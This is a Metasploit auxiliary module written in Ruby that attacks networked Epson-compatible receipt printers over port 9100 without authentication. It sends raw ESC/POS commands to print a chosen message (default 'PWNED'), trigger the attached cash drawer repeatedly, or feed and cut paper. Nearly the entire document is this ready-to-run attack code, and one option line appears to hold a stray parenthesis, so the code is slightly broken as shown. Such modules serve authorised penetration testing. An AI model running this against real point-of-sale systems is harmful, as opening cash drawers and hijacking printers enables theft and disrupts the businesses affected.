# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ESC/POS Printer Command Injector',
        'Description' => %q{
          This module exploits an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers.
          You can print a custom message, trigger the attached cash drawer, or cut the paper.
        },
        'Author' => ['FutileSkills'],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['PRINT', { 'Description' => 'Print a Message' }],
          ['DRAWER', { 'Description' => 'Trigger the Drawer' }],
          ['CUT', { 'Description' => 'Cut paper (if applicable)' }]
        ],
        'References' => [
          ['URL', 'https://github.com/futileskills/Security-Advisory']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, PHYSICAL_EFFECTS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(9100),
        OptString.new('MESSAGE', [false, 'Message to print', 'PWNED'], conditions: %w[ACTION == PRINT]),
        OptInt.new('DRAWER_COUNT', [false, 'Number of times to trigger the drawer', 1], conditions: %w[ACTION == DRAWER])),
        OptInt.new('FEED_LINES', [false, 'Number of lines to feed before cutting (for the CUT action)', 5], conditions: %w[ACTION == CUT])
      ]
    )
  end

  # ESC/POS command to trigger the cash drawer
  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32".freeze
  # ESC/POS command to feed lines
  FEED_COMMAND = "\x1b\x64".freeze
  # ESC/POS command to cut paper (full cut)
  CUT_COMMAND = "\x1d\x56\x42\x00".freeze

  def run
    connect
    print_status("Connected to printer at #{rhost}")

    case datastore['ACTION']
    when 'PRINT'
      handle_print
    when 'DRAWER'
      handle_drawer
    when 'CUT'
      handle_cut
    end
  rescue ::Rex::ConnectionError
    print_error("Failed to connect to #{rhost}")
  ensure
    disconnect
  end

  private

  def handle_print
    message = datastore['MESSAGE']
    if message.to_s.empty?
      print_error("No message specified for the 'PRINT' action.")
      return
    end

    # Break down ESC/POS commands for readability
    initialize_printer = "\x1b\x40"
    center_align = "\x1b\x61\x01"
    double_size_text = "\x1d\x21\x11"
    normal_size_text = "\x1d\x21\x00"
    left_align = "\x1b\x61\x00"

    print_commands = initialize_printer +
                     center_align +
                     double_size_text +
                     message +
                     normal_size_text + "\n" +
                     left_align + "\n\n"

    sock.put(print_commands)
    print_good("Printed message: '#{message}'")
  end

  def handle_drawer
    drawer_count = datastore['DRAWER_COUNT'].to_i.clamp(1, 10)
    print_status("Triggering cash drawer #{drawer_count} times...")
    drawer_count.times do
      sock.put(DRAWER_COMMAND)
      sleep(0.5)
    end
    print_good('Triggered cash drawer.')
  end

  def handle_cut
    feed_lines = datastore['FEED_LINES'].to_i.clamp(1, 100)
    print_status("Feeding #{feed_lines} lines and cutting paper...")
    sock.put(FEED_COMMAND + [feed_lines].pack('C'))
    sock.put(CUT_COMMAND)
    print_good('Paper fed and cut.')
  end
end
